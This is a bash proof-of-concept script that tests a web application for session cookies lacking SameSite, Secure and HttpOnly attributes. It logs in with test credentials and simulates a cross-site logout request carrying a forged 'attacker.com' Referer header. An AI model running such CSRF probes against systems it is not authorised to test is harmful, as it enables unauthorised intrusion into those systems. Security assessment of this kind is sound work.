#!/bin/bash

# POC: Missing SameSite Cookie Attribute Enables CSRF (V2)
# This script demonstrates that the session cookie lacks SameSite and Secure attributes

TARGET="${1:-http://localhost:3000}"

echo "[*] Testing Missing SameSite Cookie Attribute Vulnerability"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Get login page to check for initial cookie/form
echo "[1] Fetching login page..."
LOGIN_PAGE=$(curl -s -i "$TARGET/login")

# Extract Set-Cookie header if present on login page
INITIAL_COOKIE=$(echo "$LOGIN_PAGE" | grep -i "set-cookie:" | head -n 1)
if [ -n "$INITIAL_COOKIE" ]; then
  echo "    Initial Cookie Found:"
  echo "    $INITIAL_COOKIE"
fi

# Step 2: Perform login
echo ""
echo "[2] Attempting login..."
LOGIN_RESPONSE=$(curl -s -i -c /tmp/cookies.txt -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=csrftest&password=test123")

# Extract HTTP status code
HTTP_STATUS=$(echo "$LOGIN_RESPONSE" | head -n 1 | awk '{print $2}')
echo "    Response Status: $HTTP_STATUS"

# Extract Set-Cookie header
SET_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "set-cookie:" | head -n 1)
if [ -n "$SET_COOKIE" ]; then
  echo "    Set-Cookie Header:"
  echo "    $SET_COOKIE"
  echo ""
else
  echo "    No Set-Cookie header found in login response"
  echo ""
fi

# Step 3: Analyze cookie attributes
echo "[3] Analyzing Cookie Attributes:"
echo ""

if echo "$SET_COOKIE" | grep -iq "samesite"; then
  echo "    ✓ SameSite attribute is present"
  SAMESITE_PRESENT="true"
else
  echo "    ✗ VULNERABILITY CONFIRMED: SameSite attribute is MISSING"
  SAMESITE_PRESENT="false"
fi

if echo "$SET_COOKIE" | grep -iq "secure"; then
  echo "    ✓ Secure attribute is present"
  SECURE_PRESENT="true"
else
  echo "    ✗ VULNERABILITY CONFIRMED: Secure attribute is MISSING"
  SECURE_PRESENT="false"
fi

if echo "$SET_COOKIE" | grep -iq "httponly"; then
  echo "    ✓ HttpOnly attribute is present"
else
  echo "    ✗ Partial Issue: HttpOnly attribute is MISSING"
fi

# Step 4: Test cookie transmission in cross-site context
echo ""
echo "[4] Testing Cookie Transmission in Cross-Site Request:"

if [ -f /tmp/cookies.txt ]; then
  # Try accessing a protected endpoint with the cookie
  PROTECTED_RESPONSE=$(curl -s -i -b /tmp/cookies.txt "$TARGET/profile")
  PROTECTED_STATUS=$(echo "$PROTECTED_RESPONSE" | head -n 1 | awk '{print $2}')
  
  echo "    Accessing /profile with session cookie..."
  echo "    Response Status: $PROTECTED_STATUS"
  
  if [ "$PROTECTED_STATUS" = "200" ]; then
    echo "    ✓ Cookie successfully authenticated the request"
  fi
fi

# Step 5: Simulate CSRF attack (GET logout)
echo ""
echo "[5] Simulating CSRF Attack (Triggering Logout from Cross-Origin):"

if [ -f /tmp/cookies.txt ]; then
  # Simulate a cross-origin GET request to logout
  CSRF_LOGOUT=$(curl -s -i -b /tmp/cookies.txt -X GET "$TARGET/logout" \
    -H "Referer: http://attacker.com/malicious")
  CSRF_STATUS=$(echo "$CSRF_LOGOUT" | head -n 1 | awk '{print $2}')
  
  echo "    GET request to /logout from cross-origin..."
  echo "    Response Status: $CSRF_STATUS"
  
  if [ "$CSRF_STATUS" = "302" ] || [ "$CSRF_STATUS" = "200" ]; then
    echo "    ✗ VULNERABILITY: CSRF logout successful (cookie sent cross-site)"
  fi
fi

# Step 6: Summary
echo ""
echo "[6] Vulnerability Summary:"
echo ""

if [ "$SAMESITE_PRESENT" = "false" ] || [ "$SECURE_PRESENT" = "false" ]; then
  echo "    ✗ CRITICAL: Missing cookie protection attributes detected"
  echo ""
  echo "    Missing Attributes:"
  [ "$SAMESITE_PRESENT" = "false" ] && echo "      - SameSite (should be 'Strict' or 'Lax')"
  [ "$SECURE_PRESENT" = "false" ] && echo "      - Secure (should be set for HTTPS)"
  echo ""
  echo "    Impact:"
  echo "      - Cookies are sent with cross-site requests"
  echo "      - CSRF attacks are possible without additional protections"
  echo "      - Cookies may be transmitted over HTTP (if Secure not set)"
  echo ""
  exit 0
else
  echo "    ✓ Cookie attributes appear to be properly configured"
  exit 1
fi

rm -f /tmp/cookies.txt